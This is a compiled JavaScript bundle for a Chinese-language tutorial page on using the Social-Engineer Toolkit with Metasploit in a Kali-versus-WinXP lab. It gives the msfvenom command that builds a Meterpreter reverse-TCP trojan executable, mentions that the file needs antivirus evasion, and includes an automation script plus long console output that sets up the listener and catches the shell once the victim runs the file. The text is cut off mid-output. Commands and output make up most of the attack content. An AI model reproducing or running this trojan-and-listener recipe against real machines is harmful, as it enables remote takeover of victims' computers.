(window.webpackJsonp=window.webpackJsonp||[]).push([[292],{588:function(s,a,t){"use strict";t.r(a);var n=t(7),e=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"metasploit之社会工程学工具包"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#metasploit之社会工程学工具包"}},[s._v("#")]),s._v(" Metasploit之社会工程学工具包")]),s._v(" "),a("p",[s._v("社会工程学工具包(Social Engineering Toolkit, SET)是一套基于Python语言的工具集合，主要面向对人进行的渗透测试。使用SET可以实现多种攻击，比如：网络钓鱼攻击、网页劫持攻击、格式文件攻击等。")]),s._v(" "),a("p",[s._v("这里，我们同样以一个实际案例来进行说明。")]),s._v(" "),a("p",[s._v("攻击机 Kali 192.168.175.128")]),s._v(" "),a("p",[s._v("靶机 WinXP 192.168.175.130")]),s._v(" "),a("h2",{attrs:{id:"生成exe木马"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#生成exe木马"}},[s._v("#")]),s._v(" 生成exe木马")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("msfvenom "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v("  windows/meterpreter/reverse_tcp "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("lhost")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128 "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("lport")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4444")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" exe "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v("  shell.exe\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("注意：实际过程中，需要多exe木马进行免杀防护。")]),s._v(" "),a("h2",{attrs:{id:"将木马上传到靶机"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#将木马上传到靶机"}},[s._v("#")]),s._v(" 将木马上传到靶机")]),s._v(" "),a("p",[s._v("实际中，我们需要将靶机进行一系列的渗透之后，拿到靶机的系统权限，将木马上传或者下载到靶机。这里只是一个示例，我就直接将exe木马拷贝到靶机中了。")]),s._v(" "),a("h2",{attrs:{id:"编写社会工程学脚本se-script"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#编写社会工程学脚本se-script"}},[s._v("#")]),s._v(" 编写社会工程学脚本se-script")]),s._v(" "),a("p",[s._v("这里，我们将目录切换到Kali下的/usr/share/set目录下。")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019012721093384.png",loading:"lazy"}})]),s._v(" "),a("p",[s._v("在此目录下，创建脚本文件se-script，内容如下：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4444")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("yes")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[a("strong",[s._v("注意：这个脚本的第一行为空行")])]),s._v(" "),a("p",[s._v("如下图所示：")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127211013926.png",loading:"lazy"}})]),s._v(" "),a("h2",{attrs:{id:"安装社会工程学工具包"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#安装社会工程学工具包"}},[s._v("#")]),s._v(" 安装社会工程学工具包")]),s._v(" "),a("p",[s._v("注意：第一次使用Kali下的社会工程学工具包的时候，需要将目录切换到/usr/share/set目录下后，执行如下命令进行安装：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("./setup.py "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("install")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("如果已经执行过安装命令，则此步骤可忽略。")]),s._v(" "),a("h2",{attrs:{id:"运行社会工程学脚本se-script"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#运行社会工程学脚本se-script"}},[s._v("#")]),s._v(" 运行社会工程学脚本se-script")]),s._v(" "),a("p",[s._v("这里，我们在Kali的/usr/share/set目录下输入如下命令：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("./seautomate se-script \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("具体如下：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("root@binghe:/usr/share/set"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# ./seautomate se-script ")]),s._v("\n\n           "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("###..####.####")]),s._v("\n           "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#....#.#..........#...")]),s._v("\n           "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#.......#..........#...")]),s._v("\n           "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("###..###......#...")]),s._v("\n           "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("."),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#.#..........#...")]),s._v("\n           "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#....#.#..........#...")]),s._v("\n           "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("###..####....#...  ")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("---"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("        The Social-Engineer Toolkit "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("SET"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("         "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("---"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("---"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("        Created by: David Kennedy "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ReL1K"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("         "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("---"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n                      Version: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7.7")]),s._v(".9\n                   Codename: "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Blackout'")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("---"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("        Follow us on Twitter: @TrustedSec         "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("---"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("---"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("        Follow me on Twitter: @HackingDave        "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("---"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("---"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("       Homepage: https://www.trustedsec.com       "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("---"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n        Welcome to the Social-Engineer Toolkit "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("SET"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(".\n         The one stop shop "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" all of your SE needs.\n\n     Join us on irc.freenode.net "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" channel "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#setoolkit")]),s._v("\n\n   The Social-Engineer Toolkit is a product of TrustedSec.\n\n           Visit: https://www.trustedsec.com\n\n   It"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'s easy to update using the PenTesters Framework! (PTF)\nVisit https://github.com/trustedsec/ptf to update all your tools!\n\n\n Select from the menu:\n\n   1) Spear-Phishing Attack Vectors\n   2) Website Attack Vectors\n   3) Infectious Media Generator\n   4) Create a Payload and Listener\n   5) Mass Mailer Attack\n   6) Arduino-Based Attack Vector\n   7) Wireless Access Point Attack Vector\n   8) QRCode Generator Attack Vector\n   9) Powershell Attack Vectors\n  10) SMS Spoofing Attack Vector\n  11) Third Party Modules\n\n  99) Return back to the main menu.\n\nset> 4\n\n\n   1) Windows Shell Reverse_TCP               Spawn a command shell on victim and send back to attacker\n   2) Windows Reverse_TCP Meterpreter         Spawn a meterpreter shell on victim and send back to attacker\n   3) Windows Reverse_TCP VNC DLL             Spawn a VNC server on victim and send back to attacker\n   4) Windows Shell Reverse_TCP X64           Windows X64 Command Shell, Reverse TCP Inline\n   5) Windows Meterpreter Reverse_TCP X64     Connect back to the attacker (Windows x64), Meterpreter\n   6) Windows Meterpreter Egress Buster       Spawn a meterpreter shell and find a port home via multiple ports\n   7) Windows Meterpreter Reverse HTTPS       Tunnel communication over HTTP using SSL and use Meterpreter\n   8) Windows Meterpreter Reverse DNS         Use a hostname instead of an IP address and use Reverse Meterpreter\n   9) Download/Run your Own Executable        Downloads an executable and runs it\n\nset:payloads>2\nset:payloads> IP address for the payload listener (LHOST):192.168.175.128\nset:payloads> Enter the PORT for the reverse listener:4444\n[*] Generating the payload.. please be patient.\nyes\n[*] Payload has been exported to the default SET directory located under: /root/.set/payload.exe\nset:payloads> Do you want to start the payload and listener now? (yes/no):[*] Launching msfconsole, this could take a few to load. Be patient...\n                                                  \n\n                 _---------.\n             .'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v('####   ;."')]),s._v("\n  .---,.    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("@             @@"),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("   .---,"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("\" @@@@@'.,'@@            @@@@@',.'@@@@ \"")]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),s._v("\n'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v(".@@@@@@@@@@@@        @@@@@@@@@@@@@@ "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'\n     \"--'")]),s._v(".@@@  -.@        @ ,"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'-   .'")]),s._v("--"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\n          "')]),s._v(".@"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("' ; @       @ `.  ;'")]),s._v("\n            "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("@@@@ @@@     @    "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(".")]),s._v("\n             "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("' @@@ @@   @@    ,\n              `.@@@@    @@   .\n                '")]),s._v(",@@     @   "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("           _____________\n                 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("   "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v(" C    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("     /"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("___ / Metasploit"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\n                 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("@"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'. __*__,.\"    \\|--- \\_____________/\n                  '")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(".,"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v('"/\n\n\n       '),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" metasploit v5.0.1-dev                           "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n+ -- --"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1851")]),s._v(" exploits - "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1046")]),s._v(" auxiliary - "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("321")]),s._v(" post       "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n+ -- --"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("541")]),s._v(" payloads - "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("44")]),s._v(" encoders - "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10")]),s._v(" nops            "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n+ -- --"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v(" evasion                                       "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n+ -- --"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v(" ** This is Metasploit "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5")]),s._v(" development branch **   "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Processing /root/.set/meta_config "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" ERB directives.\nresource "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("/root/.set/meta_config"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" use multi/handler\nresource "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("/root/.set/meta_config"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" payload windows/meterpreter/reverse_tcp\npayload "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" windows/meterpreter/reverse_tcp\nresource "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("/root/.set/meta_config"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" LHOST "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128\nLHOST "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128\nresource "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("/root/.set/meta_config"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" LPORT "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4444")]),s._v("\nLPORT "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4444")]),s._v("\nresource "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("/root/.set/meta_config"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" ExitOnSession "),a("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("false")]),s._v("\nExitOnSession "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("false")]),s._v("\nresource "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("/root/.set/meta_config"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" exploit "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-j")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Exploit running as background job "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(".\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Exploit completed, but no session was created.\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Started reverse TCP handler on "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".175.128:4444 \nmsf5 exploit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("multi/handler"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br"),a("span",{staticClass:"line-number"},[s._v("44")]),a("br"),a("span",{staticClass:"line-number"},[s._v("45")]),a("br"),a("span",{staticClass:"line-number"},[s._v("46")]),a("br"),a("span",{staticClass:"line-number"},[s._v("47")]),a("br"),a("span",{staticClass:"line-number"},[s._v("48")]),a("br"),a("span",{staticClass:"line-number"},[s._v("49")]),a("br"),a("span",{staticClass:"line-number"},[s._v("50")]),a("br"),a("span",{staticClass:"line-number"},[s._v("51")]),a("br"),a("span",{staticClass:"line-number"},[s._v("52")]),a("br"),a("span",{staticClass:"line-number"},[s._v("53")]),a("br"),a("span",{staticClass:"line-number"},[s._v("54")]),a("br"),a("span",{staticClass:"line-number"},[s._v("55")]),a("br"),a("span",{staticClass:"line-number"},[s._v("56")]),a("br"),a("span",{staticClass:"line-number"},[s._v("57")]),a("br"),a("span",{staticClass:"line-number"},[s._v("58")]),a("br"),a("span",{staticClass:"line-number"},[s._v("59")]),a("br"),a("span",{staticClass:"line-number"},[s._v("60")]),a("br"),a("span",{staticClass:"line-number"},[s._v("61")]),a("br"),a("span",{staticClass:"line-number"},[s._v("62")]),a("br"),a("span",{staticClass:"line-number"},[s._v("63")]),a("br"),a("span",{staticClass:"line-number"},[s._v("64")]),a("br"),a("span",{staticClass:"line-number"},[s._v("65")]),a("br"),a("span",{staticClass:"line-number"},[s._v("66")]),a("br"),a("span",{staticClass:"line-number"},[s._v("67")]),a("br"),a("span",{staticClass:"line-number"},[s._v("68")]),a("br"),a("span",{staticClass:"line-number"},[s._v("69")]),a("br"),a("span",{staticClass:"line-number"},[s._v("70")]),a("br"),a("span",{staticClass:"line-number"},[s._v("71")]),a("br"),a("span",{staticClass:"line-number"},[s._v("72")]),a("br"),a("span",{staticClass:"line-number"},[s._v("73")]),a("br"),a("span",{staticClass:"line-number"},[s._v("74")]),a("br"),a("span",{staticClass:"line-number"},[s._v("75")]),a("br"),a("span",{staticClass:"line-number"},[s._v("76")]),a("br"),a("span",{staticClass:"line-number"},[s._v("77")]),a("br"),a("span",{staticClass:"line-number"},[s._v("78")]),a("br"),a("span",{staticClass:"line-number"},[s._v("79")]),a("br"),a("span",{staticClass:"line-number"},[s._v("80")]),a("br"),a("span",{staticClass:"line-number"},[s._v("81")]),a("br"),a("span",{staticClass:"line-number"},[s._v("82")]),a("br"),a("span",{staticClass:"line-number"},[s._v("83")]),a("br"),a("span",{staticClass:"line-number"},[s._v("84")]),a("br"),a("span",{staticClass:"line-number"},[s._v("85")]),a("br"),a("span",{staticClass:"line-number"},[s._v("86")]),a("br"),a("span",{staticClass:"line-number"},[s._v("87")]),a("br"),a("span",{staticClass:"line-number"},[s._v("88")]),a("br"),a("span",{staticClass:"line-number"},[s._v("89")]),a("br"),a("span",{staticClass:"line-number"},[s._v("90")]),a("br"),a("span",{staticClass:"line-number"},[s._v("91")]),a("br"),a("span",{staticClass:"line-number"},[s._v("92")]),a("br"),a("span",{staticClass:"line-number"},[s._v("93")]),a("br"),a("span",{staticClass:"line-number"},[s._v("94")]),a("br"),a("span",{staticClass:"line-number"},[s._v("95")]),a("br"),a("span",{staticClass:"line-number"},[s._v("96")]),a("br"),a("span",{staticClass:"line-number"},[s._v("97")]),a("br"),a("span",{staticClass:"line-number"},[s._v("98")]),a("br"),a("span",{staticClass:"line-number"},[s._v("99")]),a("br"),a("span",{staticClass:"line-number"},[s._v("100")]),a("br"),a("span",{staticClass:"line-number"},[s._v("101")]),a("br"),a("span",{staticClass:"line-number"},[s._v("102")]),a("br"),a("span",{staticClass:"line-number"},[s._v("103")]),a("br"),a("span",{staticClass:"line-number"},[s._v("104")]),a("br"),a("span",{staticClass:"line-number"},[s._v("105")]),a("br"),a("span",{staticClass:"line-number"},[s._v("106")]),a("br"),a("span",{staticClass:"line-number"},[s._v("107")]),a("br")])]),a("p",[s._v("输入的内容比较多，由输出的内容可知：SET工具包，将脚本文件se-script中的每一行内容都当做相应的参数设置到框架中了，同时自动启动了Metasploit框架进行监听。")]),s._v(" "),a("p",[s._v("此时，我们切换到靶机，点击我们的exe木马文件，如下：")]),s._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127211151864.png",loading:"lazy"}})]),s._v(" "),a("p",[s._v("切换到Kali命令行后，看到如下输出：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("msf5 exploit"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("multi/handler"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Sending stage "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("179779")]),s._v(" bytes"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" to 